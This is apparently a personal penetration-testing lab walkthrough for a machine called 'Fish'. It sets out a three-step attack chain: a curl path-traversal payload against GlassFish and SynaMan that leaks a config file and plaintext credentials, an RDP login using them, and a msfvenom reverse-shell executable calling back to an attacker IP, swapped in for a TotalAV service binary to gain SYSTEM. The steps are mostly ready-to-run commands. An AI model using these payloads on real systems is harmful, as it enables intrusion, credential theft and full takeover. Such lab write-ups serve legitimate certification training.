#box

*Created: 2/9/2026*

### Step 1

**Tags:** #SynaMan #Common-Applications #Web-Applications #Oracle-GlassFish #Path-Traversal #Credentials-Leak

🔗 **URL/Link:** https://www.exploit-db.com/exploits/45198

**Command:**
```bash
curl http://192.168.208.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%acf..%c0%af..%c0%afsynaman/config/AppConfig.xml
```

*Port: 4848*

> 
> The machine shows a few ports open, but our focus goes on port 4848, where a Glassfish Server Open Source Edition is present. Through the combination of two vulnerabilities, a Path Traversal on Glassfish [CVE-2017-100000028](https://www.exploit-db.com/exploits/45198) and another one on SynaMan 4.0 (hosted on port 6060) [CVE-2018-10814](https://www.exploit-db.com/exploits/45387) we manage to gain the credentials of a system user. `arthur:KingOfAtlantis`

---

### Step 2

**Tags:** #RDP #xfreerdp

**Command:**
```bash
xfreerdp3 +clipboard /v:192.168.208.168 /u:arthur /p:KingOfAtlantis /bpp:8 /network:modem /compression -themes -wallpaper /size:2400x1300 /drive:home,/root/Desktop/OSCP/Fish
```

*Port: 3389*

> 
> Once retrieved the credentials we manage to authenticate with RDP

---

### Step 3

**Tags:** #msfvenom #Reverse-Shell #Service-Binary-Hijacking

**Command:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.229 LPORT=3389 -f exe > SecurityService.exe
```

*💎 GEM*

> 
> Once authenticated, we discover the presence of  TotalAV on the target machine. We realize with `icacls` that we have full control over the executables inside the TotalAV folder. Moreover, we discover with `Get-CimInstance` that the system is running the Service `C:\Program Files (x86)\TotalAV\SecurityService.exe`. We replace the binary with a reverse shell one and obtain SYSTEM on the machine after a machine restart.

---

